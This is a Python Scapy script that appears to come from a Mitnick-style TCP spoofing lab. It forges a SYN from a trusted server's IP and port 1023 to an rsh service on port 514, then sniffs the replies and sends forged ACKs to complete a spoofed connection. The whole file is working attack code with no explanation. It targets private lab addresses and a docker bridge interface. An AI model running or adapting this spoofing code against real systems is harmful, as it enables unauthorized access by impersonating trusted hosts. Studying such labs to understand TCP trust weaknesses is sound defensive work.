from scapy.all import *

x_ip 		= "10.9.0.5" 
x_port 		= 514

srv_ip 		= "10.9.0.6"
sv_port 	= 1023

seq_num = 0x1000 + 1

print("SPOOFING INITIAL SYN PACKET........")

src_ip = "10.9.0.6"
dst_ip = "10.9.0.5"

src_port = 1023
dst_port = 514

ip_layer = IP(src=src_ip, dst=dst_ip)
tcp_layer = TCP(sport=src_port, dport=dst_port, flags="S",
			seq= seq_num - 1	
		)

tcp_pkt = ip_layer / tcp_layer
send(tcp_pkt)


def spoof(pkt):
	global seq_num
	print("sniffed")

	old_ip = pkt[IP]
	old_tcp = pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4 # TCP data length
	print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
		old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))	

	ip = IP(src=srv_ip, dst=x_ip)
	if old_tcp.flags == "SA":
		print("SNIFFED A SYN + ACK PACKET, SPOOFING ACK PACKET NOW........")

		src_ip = "10.9.0.6"
		dst_ip = "10.9.0.5"

		src_port = 1023
		dst_port = 514

		ip_layer = IP(src=src_ip, dst=dst_ip)
		tcp_layer = TCP(sport=src_port, dport=dst_port, flags="A",
					seq=seq_num,
					ack=old_tcp.seq+1 	# the ack number will be one more than the seq 
										# from the previous packet sent from the receiver
										# of the initial request
				)

		tcp_pkt = ip_layer / tcp_layer
		send(tcp_pkt)

	if old_tcp.flags == "A":
		print("SNIFFED AN ACK PACKET, SPOOFING ACK PACKET NOW........")
		src_ip = "10.9.0.6"
		dst_ip = "10.9.0.5"

		src_port = 1023
		dst_port = 514

		ip_layer = IP(src=src_ip, dst=dst_ip)
		tcp_layer = TCP(sport=src_port, dport=dst_port, flags="A",
					seq=seq_num,
					ack=old_tcp.seq+1 	
				)

		tcp_pkt = ip_layer / tcp_layer
		send(tcp_pkt)

sniff(iface='br-e9669d80b341', filter='tcp', prn=spoof)
